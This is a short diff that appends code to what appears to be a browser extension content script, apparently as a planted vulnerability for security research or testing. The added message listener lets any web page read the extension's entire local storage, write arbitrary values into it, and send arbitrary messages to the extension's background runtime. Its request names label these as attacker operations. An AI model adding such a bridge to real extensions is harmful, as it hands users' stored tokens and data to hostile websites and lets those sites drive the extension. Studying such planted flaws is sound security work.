@@ -1,0 +1,28 @@
+console.log('Content script running');
+
+// Appended code snippet:
+
+window.addEventListener("message",
+    function(event) {
+        if (event.source !== window || !event.data || event.data.type !== "FROM_PAGE") {
+            return;
+        }
+        let req = event.data.req;
+        if (req == "attackerReadExtensionStorageLocal") {
+            chrome.storage.local.get(null, function(items) { // null to return the entire storage
+                console.log("Local extension storage read, sending response...");
+                window.postMessage({type: "FROM_EXTENSION", resp: "responseAttackerReadExtensionStorageLocal", payload: items});
+            });
+            return true;
+        } else if (req == "attackerWriteExtensionStorageLocal") {
+            chrome.storage.local.set({[event.data.key]: event.data.value}).then(() => {
+                  console.log("Value set");
+            });
+        } else if (req == "attackerSendMessage") {
+            let message = event.data.payload;
+            chrome.runtime.sendMessage(message, (response) => {
+                window.postMessage({type: "FROM_EXTENSION", resp: "responseAttackerSendMessage", payload: response});
+            });
+        }
+    }
+);
